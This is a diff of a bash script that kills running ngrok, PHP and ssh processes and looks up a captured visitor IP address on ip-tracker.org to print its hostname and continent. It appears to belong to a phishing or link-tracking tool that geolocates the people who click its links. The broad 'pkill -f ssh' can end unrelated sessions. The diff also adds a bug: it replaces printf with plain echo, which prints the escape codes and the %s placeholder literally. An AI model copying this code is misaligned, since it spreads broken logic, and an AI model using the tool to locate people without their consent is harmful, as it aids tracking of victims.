@@ -23,20 +23,18 @@ checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
+pkill -f ngrok > /dev/null 2>&1
+killall ngrok > /dev/null 2>&1
 fi
 if [[ $checkphp == *'php'* ]]; then
-pkill -f -2 php > /dev/null 2>&1
-killall -2 php > /dev/null 2>&1
+pkill -f php > /dev/null 2>&1
+killall php > /dev/null 2>&1
 fi
 if [[ $checkssh == *'ssh'* ]]; then
-pkill -f -2 ssh > /dev/null 2>&1
+pkill -f ssh > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
 fi
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
+
 
 
 
@@ -153,14 +151,14 @@ if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
 fi
 
-IFS='\n'
+IFS=$'\n'
 iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
 IFS=$'\n'
 continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
 printf "\n"
 hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
 if [[ $hostnameip != "" ]]; then
-printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+echo "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
 fi
 ##
 
